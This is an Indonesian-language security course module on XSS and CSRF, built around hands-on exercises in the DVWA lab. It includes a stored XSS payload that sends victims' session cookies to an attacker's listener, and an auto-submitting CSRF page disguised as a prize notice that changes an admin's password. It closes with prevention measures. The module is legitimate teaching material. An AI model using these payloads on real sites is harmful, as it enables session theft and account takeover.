# 🎭 Pertemuan 9: Web Application Security - XSS & CSRF

## Daftar Isi
1. [Apa itu Cross-Site Scripting (XSS)?](#1-apa-itu-cross-site-scripting-xss)
2. [Jenis-Jenis XSS](#2-jenis-jenis-xss)
3. [Hands-On: Stored XSS untuk Pencurian Cookie](#3-hands-on-stored-xss-untuk-pencurian-cookie)
4. [Apa itu Cross-Site Request Forgery (CSRF)?](#4-apa-itu-cross-site-request-forgery-csrf)
5. [Hands-On: CSRF Attack dengan Auto-Submit Form](#5-hands-on-csrf-attack-dengan-auto-submit-form)
6. [Deteksi dan Pencegahan](#6-deteksi-dan-pencegahan)
7. [Latihan Mandiri](#7-latihan-mandiri)

---

## 1. Apa itu Cross-Site Scripting (XSS)?

**Cross-Site Scripting (XSS)** adalah jenis kerentanan di mana penyerang memasukkan script jahat (biasanya JavaScript) ke dalam halaman web yang dilihat oleh pengguna lain. Script ini dijalankan di browser korban dengan kredibilitas situs tersebut.

---

## 2. Jenis-Jenis XSS

1. **Stored XSS (Persisten)**: Script jahat tersimpan permanen di server (misal: di kolom komentar, profil user).
2. **Reflected XSS (Non-Persisten)**: Script "dipantulkan" dari request HTTP (misal: via parameter pencarian di URL).
3. **DOM-based XSS**: Kerentanan terjadi di client-side code (JavaScript) yang memproses input pengguna secara tidak aman tanpa melibatkan server.

---

## 3. Hands-On: Stored XSS untuk Pencurian Cookie

### 3.1 Setup Target
1. Buka DVWA, login, set security ke **Low**.
2. Pilih menu **XSS (Stored)**.

### 3.2 Payload Dasar
Masukkan script berikut di kolom komentar:
```html
<script>alert('Terinfeksi XSS!')</script>
```

### 3.3 Pencurian Cookie
Tujuannya adalah mengirim `document.cookie` milik korban ke server penyerang.

1. **Di Kali (Attacker)**: Jalankan listener sederhana.
```bash
python3 -m http.server 8000
```

2. **Kirim Payload XSS**: Masukkan ini di DVWA:
```html
<script>document.location='http://172.20.0.5:8000/steal?cookie=' + document.cookie;</script>
```

3. **Lihat Log**: Di terminal Kali, Anda akan melihat request masuk yang berisi session ID korban.

---

## 4. Apa itu Cross-Site Request Forgery (CSRF)?

**CSRF** adalah serangan yang memaksa pengguna yang sudah terautentikasi untuk melakukan tindakan yang tidak diinginkan pada aplikasi web tempat mereka saat ini masuk. CSRF menargetkan tindakan yang mengubah status, bukan pencurian data.

---

## 5. Hands-On: CSRF Attack dengan Auto-Submit Form

### 5.1 Skenario
Kita akan memaksa admin mengubah password mereka tanpa mereka sadari.

### 5.2 Analisis Request
Di DVWA menu **CSRF**, perhatikan URL saat mengubah password:
`http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change`

### 5.3 Membuat Exploit Page
Buat file HTML di mesin penyerang:

```html
<!-- csrf_attack.html -->
<html>
  <body onload="document.forms[0].submit()">
    <h1>Selamat! Anda memenangkan Hadiah!</h1>
    <form action="http://172.20.0.10/vulnerabilities/csrf/" method="GET">
      <input type="hidden" name="password_new" value="rahasia123" />
      <input type="hidden" name="password_conf" value="rahasia123" />
      <input type="hidden" name="Change" value="Change" />
    </form>
  </body>
</html>
```

### 5.4 Eksekusi
Jika admin membuka link `csrf_attack.html` saat sedang login di DVWA, password mereka akan otomatis berubah menjadi `rahasia123`.

---

## 6. Deteksi dan Pencegahan

### 6.1 Pencegahan XSS
1. **Output Encoding**: Ubah karakter khusus (`<`, `>`, `&`) menjadi HTML entities (`&lt;`, `&gt;`).
2. **Content Security Policy (CSP)**: Membatasi dari mana script boleh dimuat.
3. **HttpOnly Cookie**: Mencegah JavaScript mengakses cookie.

### 6.2 Pencegahan CSRF
1. **Anti-CSRF Tokens**: Token unik dan acak yang harus disertakan dalam setiap request sensitif.
2. **SameSite Cookie Attribute**: Membatasi pengiriman cookie pada cross-site requests.
3. **Verifikasi Referer/Origin Header**: Memastikan request berasal dari domain yang sama.

---

## 7. Latihan Mandiri

### Latihan 1: Reflected XSS
Coba menu **XSS (Reflected)**. Buatlah sebuah URL yang jika diklik orang lain akan memunculkan alert berisi nama mereka sendiri.

### Latihan 2: CSP Bypass
Baca artikel tentang bagaimana cara membypass Content Security Policy (CSP) yang lemah menggunakan teknik **JSONP callback**.
